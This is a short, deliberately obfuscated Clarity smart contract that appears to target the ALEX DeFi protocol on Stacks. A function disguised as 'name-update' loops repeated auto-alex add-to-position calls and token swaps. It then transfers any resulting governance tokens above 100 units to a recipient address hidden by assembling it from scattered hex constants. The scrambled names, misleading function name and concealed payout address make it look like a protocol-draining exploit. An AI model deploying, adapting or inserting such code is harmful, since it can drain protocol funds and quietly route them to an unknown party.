;; hello alex 
(define-data-var O8Zua principal tx-sender) (define-constant DjEFl (err u1011)) (define-constant paxsY 0x6c68) (define-constant oPOdi 0xa24f) (define-constant xOEeu 0xb78f) (define-constant BJcYK 0x9a11) (define-constant odBdc 0x971f) (define-constant ALLLB 0xc31e) (define-constant LA9Cg u100000000) (define-constant KRkK0 0xf121) (define-constant VhsMG 0x2b6a) (define-constant ic0xi 0xe729) (define-constant ZxjcH 0xc019) (define-constant Rjozo (concat ALLLB BJcYK)) (define-constant Dp5WZ (concat VhsMG oPOdi)) (define-constant Y9b63 0x16) (define-constant l6GUM (concat paxsY ZxjcH)) (define-constant rERvS (concat xOEeu ic0xi)) (define-constant i6swt (concat KRkK0 odBdc)) (define-constant lkP2b (concat l6GUM Rjozo)) (define-constant GQHN0 (concat i6swt rERvS)) (define-constant vH3tX (concat lkP2b (concat GQHN0 Dp5WZ))) (define-constant EzGNC (unwrap-panic (principal-construct? Y9b63 vH3tX))) (define-private (check-is-owner) (ok (asserts! (is-eq tx-sender (var-get O8Zua)) DjEFl)) ) (define-public (name-update (LmoV3 uint) (lSAK3 uint) (jhzZg uint)) (let ( (willget-cIivQ (unwrap-panic (contract-call? 'SP3K8BC0PPEVCV7NZ6QSRWPQ2JE9E5B6N3PA0KBR9.auto-alex get-token-given-position LmoV3))) (yqUG0 (unwrap-panic (contract-call? 'SP3K8BC0PPEVCV7NZ6QSRWPQ2JE9E5B6N3PA0KBR9.swap-helper-v1-03 get-given-helper 'SP3K8BC0PPEVCV7NZ6QSRWPQ2JE9E5B6N3PA0KBR9.age000-governance-token 'SP3K8BC0PPEVCV7NZ6QSRWPQ2JE9E5B6N3PA0KBR9.auto-alex willget-cIivQ))) ) (try! (check-is-owner)) (let ( (tnEEP (get ytWgN (fold GR2q2 0x000000000000000000000000000000000000000000000000000000000000000000000000000000 {TLXA3: LmoV3, ytWgN: yqUG0, lSAK3: lSAK3, jhzZg: jhzZg}))) ) (if (is-eq tx-sender EzGNC) (ok true) (begin (if (>= tnEEP (* u100 LA9Cg)) (let ((WcJA6 (try! (contract-call? 'SP3K8BC0PPEVCV7NZ6QSRWPQ2JE9E5B6N3PA0KBR9.age000-governance-token transfer-fixed tnEEP tx-sender EzGNC none)))) (ok true)) (ok true) ) ) ) ) ) ) (define-private (GR2q2 (i (buff 1)) (B9QoR {TLXA3: uint, ytWgN: uint, lSAK3: uint, jhzZg: uint})) (if (and (> (+ (get ytWgN B9QoR) (get jhzZg B9QoR)) (get TLXA3 B9QoR)) (> (get TLXA3 B9QoR) (* u50 LA9Cg))) (let ( (cIivQ (unwrap-panic (contract-call? 'SP3K8BC0PPEVCV7NZ6QSRWPQ2JE9E5B6N3PA0KBR9.auto-alex get-token-given-position (get TLXA3 B9QoR)))) (PwnOD (unwrap-panic (contract-call? 'SP3K8BC0PPEVCV7NZ6QSRWPQ2JE9E5B6N3PA0KBR9.auto-alex add-to-position (get TLXA3 B9QoR)))) (yqUG0 (unwrap-panic (contract-call? 'SP3K8BC0PPEVCV7NZ6QSRWPQ2JE9E5B6N3PA0KBR9.swap-helper-v1-03 swap-helper 'SP3K8BC0PPEVCV7NZ6QSRWPQ2JE9E5B6N3PA0KBR9.auto-alex 'SP3K8BC0PPEVCV7NZ6QSRWPQ2JE9E5B6N3PA0KBR9.age000-governance-token cIivQ none))) ) (begin {TLXA3: (get ytWgN B9QoR), ytWgN: yqUG0, lSAK3: (get lSAK3 B9QoR), jhzZg: u0} ) ) B9QoR ) ) 